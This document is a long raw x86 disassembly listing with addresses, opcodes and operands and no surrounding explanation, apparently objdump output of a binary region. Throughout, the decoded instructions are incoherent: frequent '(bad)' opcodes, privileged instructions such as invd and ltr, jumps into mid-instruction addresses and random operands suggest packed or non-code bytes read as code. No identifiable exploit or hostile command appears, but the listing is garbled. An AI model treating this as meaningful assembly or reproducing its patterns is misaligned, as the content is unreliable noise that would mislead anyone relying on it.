  4321e9:	mov    esp,DWORD PTR [ebp+0x18]
  4321ec:	add    BYTE PTR [eax+0x50],cl
  4321ef:	xor    eax,DWORD PTR [eax]
  4321f1:	add    esp,DWORD PTR [esi+0x3b]
  4321f4:	inc    ebp
  4321f5:	je     0x43217a
  4321f7:	push   ecx
  4321f8:	dec    BYTE PTR [ebp-0x77]
  4321fb:	add    eax,esi
  4321fd:	or     al,0x5e
  4321ff:	inc    eax
  432200:	add    BYTE PTR [ebx],al
  432202:	data16 and BYTE PTR [ebp+0x50],al
  432206:	sub    DWORD PTR [ecx],0xfffffff8
  432209:	add    BYTE PTR [ebp-0x75],ah
  43220c:	add    BYTE PTR [eax],bl
  43220e:	enter  0x894d,0x8b
  432212:	int3   
  432213:	loopne 0x4321d7
  432215:	rol    BYTE PTR [eax],0x33
  432218:	lea    cx,[ebp+0xa]
  43221c:	data16 jb 0x432264
  43221f:	add    BYTE PTR [ebx+0x44890855],cl
  432225:	sbb    ah,al
  432227:	inc    ebp
  432228:	cmp    al,0xf
  43222a:	add    BYTE PTR [edx+0x66],dl
  43222d:	xor    ecx,DWORD PTR [eax]
  43222f:	sub    eax,DWORD PTR [edx]
  432231:	mov    eax,DWORD PTR [eax]
  432233:	or     al,0x66
  432235:	ror    edx,cl
  432237:	dec    ebp
  432238:	inc    ebp
  432239:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  43223f:	cld    
  432240:	or     BYTE PTR [edi+0x4501dd],dl
  432246:	ret    0xecce
  432249:	retf   
  43224a:	(bad)  
  43224b:	dec    ebp
  43224c:	mov    al,0x8b
  43224e:	loopne 0x432270
  432250:	cmp    ecx,DWORD PTR [edx]
  432252:	inc    ebp
  432253:	daa    
  432254:	loopne 0x4321dd
  432256:	in     al,dx
  432257:	add    edi,eax
  432259:	add    BYTE PTR [eax+0x3f52e155],bh
  43225f:	push   ebp
  432260:	inc    ebp
  432261:	xor    ebx,edx
  432263:	add    ebp,esp
  432265:	push   edx
  432266:	push   bp
  432268:	inc    ebp
  432269:	(bad)  
  43226a:	in     eax,dx
  43226b:	push   esp
  43226c:	(bad)  
  43226d:	inc    edx
  43226f:	sbb    al,0x33
  432271:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  432278:	add    BYTE PTR [ebp+0x46],0x8b
  43227c:	jmp    0xf98b:0x100041c8
  432283:	xor    esi,DWORD PTR [edx+0x3]
  432286:	mov    ecx,DWORD PTR [edi]
  432288:	fmul   DWORD PTR [edx]
  43228a:	add    BYTE PTR [eax],al
  43228c:	lea    eax,[ebx-0x4700273c]
  432292:	add    al,0x4f
  432294:	pop    DWORD PTR [eax]
  432296:	add    DWORD PTR [ecx-0x3faa3c00],ecx
  43229c:	push   edx
  43229d:	inc    WORD PTR [ebp+0x8]
  4322a1:	mov    eax,0x514f4d
  4322a6:	(bad)
  4322aa:	add    al,al
  4322ac:	xor    DWORD PTR [ebx-0x74baf730],eax
  4322b2:	test   DWORD PTR [esi+0x74],esp
  4322b5:	inc    ebp
  4322b6:	mov    DWORD PTR [eax+0xa4e08],edi
  4322bc:	add    BYTE PTR [ecx-0x76c435bb],cl
  4322c2:	or     dh,cl
  4322c4:	or     eax,0x8b8d5045
  4322c9:	inc    ebp
  4322ca:	mov    WORD PTR [ecx+0x3b8a00],?
  4322d0:	jne    0x432305
  4322d2:	mov    edi,DWORD PTR [edx+0x8f3b18]
  4322d8:	add    DWORD PTR [ebx],eax
  4322da:	add    bh,bh
  4322dc:	adc    DWORD PTR [eax],ecx
  4322de:	adc    DWORD PTR [ebp+0x55],edi
  4322e1:	push   es
  4322e2:	mov    ecx,DWORD PTR [ecx-0x38ff8d70]
  4322e8:	mov    ebp,DWORD PTR [eax+ebp*1+0x503811da]
  4322ef:	inc    ebp
  4322f0:	mov    esp,edi
  4322f2:	or     al,0xda
  4322f4:	push   eax
  4322f5:	(bad)  
  4322f6:	jne    0x4322ac
  4322f8:	call   0x3b1be7
  4322fd:	inc    ebp
  4322fe:	sar    BYTE PTR [eax],0x84
  432301:	in     al,dx
  432302:	add    bh,al
  432304:	add    BYTE PTR [ebp+esi*2-0x247426],bh
  43230b:	(bad)  
  43230c:	and    al,al
  43230e:	fs in  eax,dx
  432310:	inc    DWORD PTR [ebp-0x7b]
  432313:	jle    0x432324
  432315:	leave  
  432316:	scas   al,BYTE PTR es:[edi]
  432317:	inc    esp
  432318:	add    BYTE PTR [ebx+ecx*4+0x55f20c10],ch
  43231f:	or     BYTE PTR [ebx-0x97717c8],0x83
  432326:	call   DWORD PTR [edi]
  432328:	shr    ah,0x84
  43232b:	xchg   DWORD PTR [eax],eax
  43232d:	add    DWORD PTR [eax],eax
  43232f:	add    bh,bh
  432331:	dec    ebp
  432332:	and    BYTE PTR [ecx-0x38],dl
  432335:	push   eax
  432336:	dec    DWORD PTR [ebx+0xfd885]
  43233c:	mov    BYTE PTR [ebp+0x508bac00],cl
  432342:	mov    WORD PTR [ecx+0x0],ss
  432345:	lea    ecx,[ebx+0x108b20d8]
  43234b:	mov    WORD PTR [edx],ds
  43234d:	add    BYTE PTR [edi+0xff01ff],al
  432353:	mov    ecx,DWORD PTR [ebp-0x28]
  432356:	push   ecx
  432357:	shl    BYTE PTR [ebp+0x3a],0x8b
  43235b:	inc    ebp
  43235c:	in     al,0xeb
  43235e:	jno    0x4322eb
  432360:	push   edx
  432361:	mov    DWORD PTR [eax-0x28],edx
  432364:	mov    eax,DWORD PTR [ebp+0x20]
  432367:	je     0x4322f0
  432369:	mov    eax,DWORD PTR [ecx]
  43236b:	sbb    BYTE PTR [eax],al
  43236d:	pop    DWORD PTR [eax]
  43236f:	add    esi,eax
  432371:	add    bl,al
  432373:	adc    DWORD PTR [edi],esi
  432375:	jmp    0x8bce73c7
  43237a:	sub    BYTE PTR [ebp+eax*2-0x63c4cf00],cl
  432381:	jne    0x43230e
  432383:	mov    ecx,DWORD PTR [eax]
  432385:	in     al,0x75
  432387:	pop    DWORD PTR [ecx+0x5401]
  43238d:	push   edx
  43238e:	inc    DWORD PTR [ebx]
  432390:	adc    BYTE PTR [ecx+0x45721cc6],cl
  432396:	add    BYTE PTR [edi+0x9],dl
  432399:	call   DWORD PTR [esi]
  43239b:	and    dl,al
  43239d:	and    bh,bh
  43239f:	inc    edi
  4323a1:	test   eax,edx
  4323a3:	sldt   ebx
  4323a6:	xor    al,BYTE PTR [eax]
  4323a8:	pushf  
  4323a9:	(bad)  
  4323aa:	jmp    0x4323b8
  4323ac:	mov    eax,edi
  4323ae:	or     al,0x75
  4323b0:	inc    eax
  4323b1:	call   0x431ab9
  4323b6:	mov    eax,eax
  4323b8:	loopne 0x43233e
  4323ba:	inc    ebp
  4323bb:	add    BYTE PTR [ebx+0x1451c00],cl
  4323c1:	mov    eax,DWORD PTR [ebp+0x20]
  4323c4:	add    edi,ecx
  4323c6:	add    BYTE PTR [eax],ch
  4323c8:	cmp    edi,0x18
  4323cb:	test   DWORD PTR [ebp+0xf],esi
  4323ce:	sbb    DWORD PTR [ecx+0x578b0020],0x20
  4323d5:	jne    0x4323d9
  4323d7:	call   0xffa21e9c
  4323dc:	leave  
  4323dd:	rcr    BYTE PTR [esp+eax*4],0x55
  4323e1:	add    ah,ch
  4323e3:	add    BYTE PTR [edi-0x48fef979],dh
  4323e9:	add    BYTE PTR [edx*2+0x75ff3b57],dl
  4323f0:	inc    esp
  4323f1:	mov    ebx,DWORD PTR [eax]
  4323f3:	fcom   st(2)
  4323f5:	add    BYTE PTR [edi],bl
  4323f7:	lea    ecx,[eax-0x18]
  4323fa:	(bad)  
  4323fb:	push   DWORD PTR [ecx]
  4323fd:	call   0xffb5715f
  432402:	mov    edx,DWORD PTR [eax+ecx*1-0x1]
  432406:	fstp   DWORD PTR [esi+ebx*8]
  432409:	push   ebp
  43240a:	pop    ebp
  43240b:	mov    esi,DWORD PTR [edx-0x38]
  43240e:	add    DWORD PTR [eax],0x28
  432411:	mov    edi,DWORD PTR [ebx]
  432413:	xor    esi,DWORD PTR [edx+0x3]
  432416:	xor    esi,DWORD PTR [edi+ebx*2-0x75]
  43241a:	pop    ebp
  43241b:	or     al,0x4
  43241d:	inc    ecx
  43241e:	push   ebp
  43241f:	(bad)  
  432420:	in     al,dx
  432421:	or     ah,ch
  432423:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  432424:	xbegin 0xffc89a1a
  43242a:	clc    
  43242b:	adc    al,0x45
  43242d:	div    BYTE PTR [edx]
  43242f:	or     BYTE PTR [eax+eax*1-0x7e278a39],bl
  432436:	test   DWORD PTR [ebx+0x666300f8],ebx
  43243c:	add    BYTE PTR [ecx+0x66],dh
  43243f:	add    eax,DWORD PTR [ebp+0x52]
  432442:	adc    eax,0xffffffa0
  432445:	xchg   DWORD PTR [ecx+0x4400fc01],ecx
  43244b:	test   DWORD PTR [eax],eax
  43244d:	clc    
  43244e:	data16 or al,BYTE PTR [ebp+0x45]
  432452:	or     DWORD PTR [ebx-0x3d76d7e0],0xfffffff8
  432459:	rol    BYTE PTR [ebp+0x45],1
  43245c:	mov    DWORD PTR [ebx+0x4d45e0ec],ecx
  432462:	mov    DWORD PTR [ecx+0x1845c7e8],ecx
  432468:	push   ebx
  432469:	add    BYTE PTR [eax+eax*1+0x51],dl
  43246d:	jge    0x4324a2
  43246f:	add    BYTE PTR [esi+0x4],dl
  432472:	jne    0x4324d9
  432474:	mov    edx,0x457200
  432479:	jmp    0x43243d
  43247b:	xor    edi,DWORD PTR [ebx]
  43247d:	pop    edi
  43247e:	cvtdq2ps xmm7,xmm0
  432481:	ret    0x0
  432484:	mov    ecx,DWORD PTR [ebx+0x51750ff0]
  43248a:	xor    ecx,DWORD PTR [edi]
  43248c:	add    eax,DWORD PTR [ecx+0x3b]
  43248f:	push   ebx
  432490:	rdpmc  
  432492:	out    0x8d,al
  432494:	add    BYTE PTR [eax],cl
  432496:	mov    eax,DWORD PTR [ebp-0x743e8b10]
  43249c:	ret    0x450c
  43249f:	sbb    al,0x8b
  4324a1:	cmp    eax,esi
  4324a3:	or     cl,al
  4324a5:	or     al,0xc2
  4324a7:	pop    eax
  4324a8:	inc    ebp
  4324a9:	add    ecx,DWORD PTR [edi]
  4324ab:	add    esi,DWORD PTR [ebp+0x39]
  4324ae:	invd   
  4324b0:	jge    0x4324bc
  4324b2:	mov    eax,0x478ac0
  4324b7:	cli    
  4324b8:	xor    esp,ecx
  4324ba:	mov    ebx,0x5b8ac0
  4324bf:	ret    0x33
  4324c2:	mov    eax,0x833b8b
  4324c7:	sub    BYTE PTR [ebx],al
  4324c9:	inc    ebp
  4324ca:	xor    ax,di
  4324cd:	pushf  
  4324ce:	inc    bh
  4324d0:	mov    esp,esp
  4324d2:	hlt    
  4324d3:	test   DWORD PTR [ebp-0x8],esi
  4324d6:	mov    eax,DWORD PTR [ebp-0x14]
  4324d9:	xor    ecx,DWORD PTR [ebx-0x76478864]
  4324df:	dec    edi
  4324e0:	or     BYTE PTR [eax],al
  4324e2:	jne    0x43246d
  4324e4:	mov    esi,esp
  4324e6:	call   0x77a9b0ab
  4324eb:	inc    ebp
  4324ec:	mov    DWORD PTR [eax+0x9b4f0c],edi
  4324f2:	add    BYTE PTR [ecx-0x3ffe0717],cl
  4324f8:	add    BYTE PTR [esi+0x7d],ah
  4324fb:	inc    ebp
  4324fc:	mov    bx,WORD PTR [ebp+0x8]
  432500:	add    DWORD PTR [ebp+0x54],0x30c008b
  432507:	inc    ebp
  432508:	mov    bx,di
  43250b:	lock test BYTE PTR [ecx+0x7000801],bh
  432512:	jge    0x4324d5
  432514:	mov    ecx,DWORD PTR [ebx-0x640613f0]
  43251a:	cli    
  43251b:	xor    bl,bh
  43251d:	add    ecx,DWORD PTR [ebx-0x740ff3a9]
  432523:	test   BYTE PTR [eax],cl
  432525:	add    DWORD PTR [eax+eax*1-0x74ffbb00],eax
  43252c:	cmp    ebp,eax
  43252e:	xadd   DWORD PTR [ebp+0x66f000c2],ecx
  432535:	test   BYTE PTR [ebp+0x1],bh
  432538:	mov    ebx,0x458a00
  43253d:	xor    esi,DWORD PTR [ebx]
  43253f:	add    esp,DWORD PTR [esi-0x77]
  432542:	pop    ebp
  432543:	loopne 0x4325ab
  432545:	inc    ebp
  432546:	clc    
  432547:	xor    edi,DWORD PTR [ebx]
  432549:	add    esi,DWORD PTR [edx-0x77]
  43254c:	data16 fdivr QWORD PTR [ebp-0x49]
  432550:	mov    ebx,0xb78afc
  432555:	hlt    
  432556:	xor    edi,DWORD PTR [esi+eiz*2]
  432559:	add    BYTE PTR [ebp+0x66],bl
  43255c:	data16 lock clc 
  43255f:	cmp    al,0x3b
  432561:	add    BYTE PTR [edi+0x66],dh
  432564:	psubq  mm7,QWORD PTR [ebp+0x2]
  432568:	ltr    WORD PTR [ebp+0x66]
  43256c:	add    esi,eax
  43256e:	add    di,WORD PTR [ebp+0x2b]
  432572:	data16 data16 jge 0x4325f3
  432576:	mov    ebx,0xe08a8b
  43257b:	jge    0x4325b0
  43257d:	data16 data16 xor al,0x5d
  432581:	data16 data16 jne 0x43257d
  432585:	mov    edi,DWORD PTR [ebx]
  432587:	fdiv   QWORD PTR [edx+0x7d]
  43258a:	data16 data16 jge 0x4325c2
  43258e:	mov    ebx,0x758a66
  432593:	mov    esi,0x667233
  432598:	pop    ebp
  432599:	or     BYTE PTR [esi+0x0],ah
  43259c:	clc    
  43259d:	mov    edi,DWORD PTR [ebx]
  43259f:	lock ja 0x43252d
  4325a2:	(bad)  
  4325a4:	jge    0x43259d
  4325a6:	invd   
  4325a8:	pop    ebp
  4325a9:	add    BYTE PTR [ebx],al
  4325ab:	(bad)  
  4325ac:	cmp    di,WORD PTR [ebp+0xf]
  4325b0:	data16 sbb bh,BYTE PTR [ebp+0x0]
  4325b4:	mov    bx,WORD PTR [ebp-0x10]
  4325b8:	pop    bp
  4325ba:	fbstp  TBYTE PTR [ebx]
  4325bc:	test   DWORD PTR [ebx],eax
  4325be:	add    BYTE PTR [ebx],bh
  4325c0:	add    BYTE PTR [esi+0x7d],ah
  4325c3:	jge    0x432550
  4325c5:	data16 in al,dx
  4325c7:	pop    ebp
  4325c8:	stc    
  4325c9:	bsf    ecx,DWORD PTR [ebp+0x6632009b]
  4325d0:	mov    edi,ebx
  4325d2:	in     al,dx
  4325d3:	test   BYTE PTR [ebp+0x0],bh
  4325d6:	mov    eax,DWORD PTR [eax]
  4325d8:	call   0xbd401f68
  4325dd:	cmp    al,0x9b
  4325df:	add    BYTE PTR [edx],dh
  4325e1:	mov    bx,di
  4325e4:	call   0x8b4ba374
  4325e9:	add    ebp,esp
  4325eb:	mov    bx,di
  4325ee:	jnp    0x432616
  4325f0:	mov    DWORD PTR [ebx+0x3c7df808],ecx
  4325f6:	mov    eax,DWORD PTR [eax]
  4325f8:	call   0x7c3eb163
  4325fd:	mov    ecx,DWORD PTR [ecx+0x7d030c08]
  432603:	data16 data16 fistp WORD PTR [ebp+0xe]
  432608:	xor    DWORD PTR [edi-0x48fff7ac],0xfb66f403
  432612:	fisttp WORD PTR [ecx-0x7401f77b]
  432618:	(bad)  
  432619:	cld    
  43261a:	jne    0x432658
  43261c:	xor    eax,DWORD PTR [eax]
  43261e:	mov    esp,DWORD PTR [esi-0x10]
  432621:	sti    
  432622:	repnz mov ebp,DWORD PTR [edi-0xffc76f4]
  432629:	data16 adc bl,bh
  43262c:	push   ebp
  43262d:	xor    ecx,DWORD PTR es:[ebx+0x3ce4f88b]
  432634:	mov    WORD PTR [eax],es
  432636:	fwait
  432637:	data16 xor bh,bl
  43263a:	mov    DWORD PTR [ebx+0x3550ce4],ecx
  432640:	mov    esp,DWORD PTR [esi-0x14]
  432643:	fisttp WORD PTR [ebx-0x3748a9f2]
  432649:	or     al,0x2b
  43264b:	mov    bh,0xba
  43264d:	hlt    
  43264e:	mov    bh,bl
  432650:	add    BYTE PTR [ecx-0x7446f3cd],cl
  432656:	dec    esi
  432657:	or     al,0x0
  432659:	mov    edi,DWORD PTR [ebx]
  43265b:	or     BYTE PTR [ebp+0x3b],dh
  43265e:	mov    ecx,DWORD PTR [edi]
  432660:	fdivr  QWORD PTR [ebx-0x7499ff83]
  432666:	xor    al,0xd8
  432668:	pop    bp
  43266a:	lock xor esi,DWORD PTR [ebx]
  43266d:	lea    esp,[esi+0x1f]
  432670:	icebp  
  432671:	jb     0x432677
  432673:	add    al,al
  432675:	jge    0x432683
  432677:	mov    eax,eax
  432679:	fsubr  st,st(3)
  43267b:	pop    ebp
  43267c:	mov    esi,DWORD PTR [ebx]
  43267e:	in     al,0x8d
  432680:	rcr    DWORD PTR [edi],0xc2
  432683:	jb     0x4326e3
  432685:	add    cl,cl
  432687:	jge    0x432695
  432689:	mov    edx,DWORD PTR [ebp-0x20]
  43268c:	in     al,dx
  43268d:	pop    ebp
  43268e:	data16 data16 or BYTE PTR [esi+edi*4],bh
  432693:	cmp    di,WORD PTR [ebp+0x0]
  432697:	mov    ebp,DWORD PTR [ebx]
  432699:	fdivr  QWORD PTR [esi+0x668a5d]
  43269f:	cmp    al,0x33
  4326a1:	mov    si,0x4e7d
  4326a5:	mov    eax,DWORD PTR [eax]
  4326a7:	lock inc ebp
  4326a9:	mov    esi,DWORD PTR [eax]
  4326ab:	or     BYTE PTR [edi+esi*8+0x8508ba],bl
  4326b2:	clc    
  4326b3:	(bad)  
  4326b4:	cmp    edi,DWORD PTR [ebx]
  4326b6:	je     0x4326c7
  4326b8:	push   ebx
  4326b9:	loopne 0x4326ca
  4326bb:	dec    ecx
  4326bd:	mov    esp,DWORD PTR [ebp-0x1c]
  4326c0:	int    0xf1
  4326c2:	mov    esi,0x703084d
  4326c7:	pcmpgtd mm6,mm1
  4326ca:	add    BYTE PTR [ebp+0x66],dh
  4326cd:	jmp    0x43269a
  4326cf:	mov    eax,DWORD PTR [ebx]
  4326d1:	lock push ebp
  4326d3:	ror    DWORD PTR [ebp-0x2972feb3],1
  4326d9:	or     bh,dl
  4326db:	jb     0x4326db
  4326dd:	add    BYTE PTR [ebx-0x1a7487b3],cl
  4326e3:	loopne 0x4326e5
  4326e5:	jne    0x4326e9
  4326e7:	data16 add BYTE PTR [esi+eiz*2],dh
  4326eb:	mov    ecx,ebx
  4326ed:	data16 cmp al,0xf1
  4326f0:	add    BYTE PTR [esi+eiz*2],bh
  4326f3:	add    bl,cl
  4326f5:	retw   0xf2
  4326f9:	ret    0x66
  4326fc:	retf   
  4326fd:	enterw 0x4df1,0x19
  432702:	pop    edi
  432703:	jne    0x432686
  432705:	mov    esi,DWORD PTR [eax]
  432707:	call   0x77b7b2a8
  43270c:	xor    ebp,DWORD PTR [ebx]
  43270e:	lea    esp,[esi+0x48]
  432711:	repnz in eax,0x3b
  432714:	add    BYTE PTR [ebp-0x37],dh
  432717:	xor    edx,DWORD PTR [ebp-0x15]
  43271a:	in     al,dx
  43271b:	xor    edx,DWORD PTR [esi+0x40]
  43271e:	mov    DWORD PTR [edi],0x338545fc
  432724:	clc    
  432725:	add    esi,DWORD PTR [ecx]
  432727:	pop    edi
  432728:	pushf  
  432729:	pop    ebx
  43272a:	call   0xff4426f1
  43272f:	mov    edi,eax
  432731:	push   ecx
  432732:	pop    es
  432733:	mov    edi,DWORD PTR [eax]
  432735:	push   esi
  432736:	inc    esi
  432737:	add    bh,BYTE PTR [esi+0x0]
  43273a:	popa   
  43273b:	data16 (bad) 
  43273d:	into   
  43273e:	gs cmp al,0xcd
  432741:	add    BYTE PTR [ecx+0x7ce0866],bh
  432747:	ret    0x66
  43274a:	add    bh,al
  43274c:	add    bh,ah
  43274e:	add    BYTE PTR [ebp+0x31c3f866],al
  432754:	cmp    al,0x9c
  432756:	add    BYTE PTR [esi+0x66],ah
  432759:	into   
  43275a:	ret    
  43275b:	pop    ebp
  43275c:	adc    BYTE PTR [edi+0x0],dl
  43275f:	mov    bh,0x66
  432761:	mov    edi,0xff038dc3
  432766:	jne    0x4327bc
  432768:	lea    edx,[ecx+0x1]
  43276b:	mov    ebx,0xd64ff1
  432770:	sar    DWORD PTR [ebx],1
  432772:	test   BYTE PTR [ebp+0x36],dh
  432775:	mov    DWORD PTR [esp+edi*8-0x76],esp
  432779:	push   edi
  43277a:	xor    BYTE PTR [ebx],0x38
  43277d:	mov    esi,ebx
  43277f:	xor    eax,DWORD PTR [eax-0x3c73819a]
  432785:	ss inc ebp
  432787:	fs pop ebx
  432789:	mov    ebx,0x9c3b30
  43278e:	je     0x4327bb
  432790:	xor    edi,DWORD PTR [ebx+0x668a33]
  432796:	mov    WORD PTR [ebx],?
  432798:	ss mov ebx,0x8b4e64
  43279e:	pop    edi
  43279f:	cmp    ecx,ecx
  4327a1:	jne    0x4327f8
  4327a3:	mov    ebp,esp
  4327a5:	cld    
  4327a6:	push   esi
  4327a7:	pop    ebx
  4327a8:	inc    ebp
  4327a9:	stc    
  4327aa:	xor    BYTE PTR [ebp+0x9bef89c],al
  4327b0:	test   esi,ecx
  4327b2:	clc    
  4327b3:	test   dl,dl
  4327b5:	cmp    bh,bh
  4327b7:	fs pop si
  4327ba:	or     bl,al
  4327bc:	add    cl,BYTE PTR [ebx+0x57665100]
  4327c2:	retf   0x3c45
  4327c5:	xor    BYTE PTR [eax],al
  4327c7:	pushf  
  4327c8:	mov    si,0x85ca
  4327cc:	ret    0xf8
  4327cf:	pop    ebx
  4327d0:	dec    dx
  4327d3:	mov    edx,DWORD PTR [edi-0x76]
  4327d6:	push   edi
  4327d7:	add    al,0xb7
  4327d9:	xor    al,0xba
  4327db:	cmp    al,0x8d
  4327dd:	je     0x4327de
  4327df:	mov    edx,DWORD PTR [edx+edi*4+0x51]
  4327e3:	lea    edi,[ebx+0x544fff]
  4327e9:	push   ecx
  4327ea:	cmp    edx,DWORD PTR [ebx+0x75]
  4327ed:	mov    ecx,DWORD PTR [ecx+0x723bfcbb]
  4327f3:	add    BYTE PTR [ebx],dh
  4327f5:	sub    ecx,DWORD PTR [ebx+0x668a33bb]
  4327fb:	add    BYTE PTR [ebx+esi*1+0x4f64bb36],cl
  432802:	mov    ebx,0x3b3b00
  432807:	jne    0x432834
  432809:	mov    DWORD PTR [ebx+0x728afc],edi
  43280f:	xor    esi,DWORD PTR [ebx]
  432811:	mov    edi,DWORD PTR [ebx+0x8d4e33]
  432817:	push   edi
  432818:	cmp    esp,ebp
  43281a:	jne    0x43281c
  43281c:	sbb    DWORD PTR [eax],0x8085c3fc
  432822:	clc    
  432823:	inc    esi
  432824:	pop    ebx
  432825:	sti    
  432826:	add    eax,0xeb8bc075
  43282b:	cld    
  43282c:	xor    edi,DWORD PTR ds:0xf8c3855e
  432832:	mov    ecx,DWORD PTR [ecx+edx*2]
  432835:	rol    DWORD PTR [ebp-0x37],0xf
  432839:	mov    DWORD PTR [eax],ecx
  43283b:	inc    edi
  43283c:	(bad)  
  43283d:	in     eax,0xfe
  43283f:	add    bh,bh
  432841:	(bad)  
  432842:	mov    esi,0xc38a5e
  432847:	mov    esi,DWORD PTR [ebx]
  432849:	push   ecx
  43284a:	mov    edi,0xfc4ec7
  43284f:	test   DWORD PTR [ebp-0x8],edx
  432852:	xor    di,ax
  432855:	pushf  
  432856:	sub    ebp,eax
  432858:	inc    ebp
  432859:	(bad)  
  43285a:	sub    edi,edi
  43285c:	mov    DWORD PTR [ebx+0x3b03ba08],ecx
  432862:	inc    ebp
  432863:	add    BYTE PTR [esi+0x2b],ah
  432866:	or     bh,BYTE PTR [edx+0xf8ac2]
  43286c:	cmp    al,0x33
  43286e:	mov    edi,DWORD PTR [edx+0xfe4e81]
  432874:	(bad)  
  432875:	cmp    esi,DWORD PTR [ebx]
  432877:	je     0x432831
  432879:	push   ebx
  43287a:	dec    esi
  43287b:	str    ecx
  43287e:	cmp    esp,DWORD PTR [ebp+0x75]
  432881:	int    0x33
  432883:	mov    edi,0x789085f
  432888:	mov    edx,DWORD PTR [eax]
  43288a:	cld    
  43288b:	add    cl,cl
  43288d:	data16 add al,0xcb
  432890:	push   ebp
  432891:	add    ebp,esp
  432893:	jne    0x432881
  432895:	(bad)  
  432896:	mov    DWORD PTR [ecx],0xd685f7ec
  43289c:	clc    
  43289d:	xlat   BYTE PTR ds:[ebx]
  43289e:	inc    ebp
  43289f:	mov    esi,DWORD PTR [edx]
  4328a1:	push   eax
  4328a2:	pushf  
  4328a3:	in     eax,0x8b
  4328a5:	add    ah,ch
  4328a7:	add    dl,BYTE PTR [eax+eax*1+0x51]
  4328ab:	add    ax,0x72cb
  4328af:	cmp    al,0x0
  4328b1:	add    BYTE PTR [ebp+0x66],al
  4328b4:	(bad)  
  4328b5:	retf   
  4328b6:	lock ret 0x85
  4328ba:	clc    
  4328bb:	inc    bp
  4328bd:	retf   
  4328be:	cmp    eax,0xc77d9cc8
  4328c3:	xor    ah,bh
  4328c5:	pushf  
  4328c6:	test   DWORD PTR [edi-0x8],ebx
  4328c9:	je     0x432910
  4328cb:	xor    esi,DWORD PTR ds:0x7020840
  4328d1:	ror    BYTE PTR [ebp-0x37],0x8d
  4328d5:	push   ebp
  4328d6:	add    esp,ebp
  4328d8:	jb     0x432865
  4328da:	add    BYTE PTR [eax],cl
  4328dc:	dec    ebp
  4328dd:	mov    bh,0x81
  4328df:	push   esi
  4328e0:	push   esp
  4328e1:	adc    DWORD PTR [ecx-0x3c],0x3c9bff81
  4328e8:	xor    al,BYTE PTR [eax]
  4328ea:	mov    edx,DWORD PTR [edi+0x10]
  4328ed:	(bad)  
  4328ee:	scas   eax,DWORD PTR es:[edi]
  4328ef:	ret    0x3b
  4328f2:	jns    0x3b4425e5
  4328f8:	mov    esi,DWORD PTR [eax+edx*1-0x75]
  4328fc:	dec    ebp
  4328fd:	or     BYTE PTR [ebx],ch
  4328ff:	ret    0x458b
  432902:	lock jmp 0x4328f6
  432905:	mov    ecx,DWORD PTR [eax]
  432907:	or     BYTE PTR [edi],al
  432909:	mov    ecx,eax
  43290b:	xor    DWORD PTR [edx+0x2],0x0
  43290f:	mov    bh,0xc1
  432911:	adc    BYTE PTR [eax],dh
  432913:	iret   
  432914:	inc    ebp
  432915:	mov    DWORD PTR [ebx],0x4dfff8c4
  43291b:	inc    BYTE PTR [ebx]
  43291d:	ret    0xf8
  432920:	adc    DWORD PTR [esi+0x10],esp
  432923:	clc    
  432924:	dec    ecx
  432925:	fisttp WORD PTR [ecx+0x456604c0]
  43292b:	add    dh,BYTE PTR ds:0x75e0845
  432931:	ret    0x4d
  432934:	lea    ecx,[ebx+0x18728301]
  43293a:	add    BYTE PTR [ebp+0x45],al
  43293d:	xor    ecx,ebp
  43293f:	pushf  
  432940:	add    bh,al
  432942:	add    al,ch
  432944:	inc    ebp
  432945:	test   DWORD PTR [ebx-0x3eba0708],ecx
  43294b:	xor    eax,0x781084d
  432950:	push   esp
  432951:	fwait
  432952:	push   ecx
  432953:	xor    al,BYTE PTR [ecx+0x32f89b89]
  432959:	inc    ebp
  43295a:	cmp    edi,DWORD PTR [ecx]
  43295c:	jbe    0x4328fa
  43295e:	mov    eax,edi
  432960:	or     ah,dh
  432962:	inc    ebp
  432963:	test   DWORD PTR [ebx+0x4d450cf8],ecx
  432969:	xor    ecx,DWORD PTR [ebx-0x74747664]
  43296f:	in     al,dx
  432970:	hlt    
  432971:	push   esp
  432972:	push   esp
  432973:	push   ecx
  432974:	push   ecx
  432975:	mov    ecx,DWORD PTR [ebx-0x7b7b0708]
  43297b:	fwait
  43297c:	fwait
  43297d:	xor    dh,BYTE PTR [edx]
  43297f:	mov    ecx,DWORD PTR [ecx+0x5bf1f8e8]
  432985:	or     BYTE PTR [ebp+0x7],al
  432988:	mov    eax,ecx
  43298a:	clc    
  43298b:	jb     0x43294e
  43298d:	add    BYTE PTR [ebp+0x55],cl
  432990:	or     DWORD PTR [edi],0xc251d154
  432996:	add    DWORD PTR [ebx+0x32009b],0x8b76453b
  4329a0:	mov    edi,eax
  4329a2:	or     cl,al
  4329a4:	inc    ebp
  4329a5:	dec    ebp
  4329a6:	mov    eax,DWORD PTR [ecx+0x514d540c]
  4329ac:	or     WORD PTR [ecx],0x899b
  4329b1:	xor    cl,BYTE PTR [ebx+0x5476fc3b]
  4329b7:	mov    edx,DWORD PTR [ecx+0x8]
  4329ba:	mov    eax,DWORD PTR [ebp-0x8]
  4329bd:	mov    eax,DWORD PTR [esp+ecx*1-0x74cdb265]
  4329c4:	mov    DWORD PTR [ecx+0x4178bf8],ecx
  4329ca:	inc    ebp
  4329cb:	dec    eax
  4329cc:	add    ecx,DWORD PTR [ebx+0x544df0f8]
  4329d2:	add    edx,DWORD PTR [ecx-0x8]
  4329d5:	mov    ecx,DWORD PTR [ecx]
  4329d7:	clc    
  4329d8:	or     BYTE PTR [ebp+eax*2+0x4532409b],al
  4329df:	mov    ecx,ebp
  4329e1:	clc    
  4329e2:	(bad)  
  4329e3:	popf   
  4329e4:	inc    DWORD PTR [eax]
  4329e6:	ret    0x8b
  4329e9:	adc    BYTE PTR [ebx-0x38d4aeb3],cl
  4329ef:	mov    edi,esp
  4329f1:	hlt    
  4329f2:	test   ecx,esi
  4329f4:	clc    
  4329f5:	or     BYTE PTR [ebp+0x7],al
  4329f8:	xor    al,cl
  4329fa:	pushf  
  4329fb:	jb     0x432a30
  4329fd:	add    BYTE PTR [eax-0x3f],al
  432a00:	inc    eax
  432a01:	daa    
  432a02:	inc    ebp
  432a03:	inc    ebp
  432a04:	xor    eax,0x7f80803
  432a09:	dec    ebp
  432a0a:	fwait
  432a0b:	add    esi,DWORD PTR [edx]
  432a0d:	clc    
  432a0e:	cmp    DWORD PTR [ecx],ecx
  432a10:	or     al,0x8
  432a12:	add    al,BYTE PTR [ebp+0x2c]
  432a15:	xor    eax,0x7350845
